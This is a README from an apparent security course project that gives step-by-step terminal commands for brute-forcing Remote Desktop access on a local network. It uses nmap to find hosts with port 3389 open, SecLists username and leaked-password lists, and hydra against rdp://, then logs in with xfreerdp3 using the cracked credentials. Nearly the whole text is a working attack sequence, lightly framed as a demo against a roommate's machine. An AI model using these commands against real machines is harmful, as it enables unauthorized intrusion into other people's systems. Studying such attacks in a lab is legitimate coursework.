# BFOR519-Final-Repo
Terminal script used for remote access to a machine using LAN
$ ip a
# Avaialble IP addresses will be returned
$ nmap -p 3389 ["IP Address"]
# This will scan the network for machines with remote access available through the corresponding port 3389 (You will replace the "IP Address" with your corresponding subnet which is found from $ ip a). As well as return systems with port 3389 open
$ hydra
# Checks for hydra installation
$ cd wordlists/
$ls
# If SecList is uninstalled perform the following
$ sudo apt update
$ sudo apt install seclists
# If performed properly SecLists will be installed under the wordlists folder
$ cd seclists
$ ls
# What returns is files containing real world leaked user credentials such as xato-net-10-million-usernames.txt which you will run in the following command
$ cat xato-net-10-million-usernames.txt
# This will return far too many credentials to be used in our demo therefor we will try a shorter list and run the following
$ cat top-usernames-shortlist.txt 
# This folder will return far less usernames, for sake of arguement we will add the username "Joe" as per my roomates name
$ cd ../Passwords/
$ ls
# This will show us our password lists installed in which we can decide on a good database
$ cd Leaked-Databases/
# This is the password database we will incorporate into our study
$ cat rockyou-.05.txt
# This is a shorter list of some of the most common passwords
# At this point we now have a username list, password list, and the target IP address
$ cd /usr/share/wordlists/seclists
$ hydra -t 4 -V -f -L Usernames/top-usernames-shortlist.txt -P Passwords/Leaked-Databases/rockyou-05.txt rdp:// ["IP Address"]
# This command will launch the hydra attack implementing the list of usernames and passwords we downloaded prior (-t 4 tells hydra to run 4 login attempts simultaneously, -V meands verbose which shows each attempt as it happens, -f tells hydra to stop upon a correct attempt) 
# For sake of demo these lists are shortened so the attempt to find the correct match is efficient. Our correct match ended up being user: Joe pass: 123456
$ xfreerdp3 /u:Joe /p:123456 /v:["IP Address"]
# With this command we use the tool xfreedrp to run the attack on the IP(/v) using the username and password correlated to the IP as shown
# Once ran one will be asked if you trust the certificate to which you will respond as follows
$ yes
# From this a remote desktop window will pop up and you will have successfully accessed your target's system
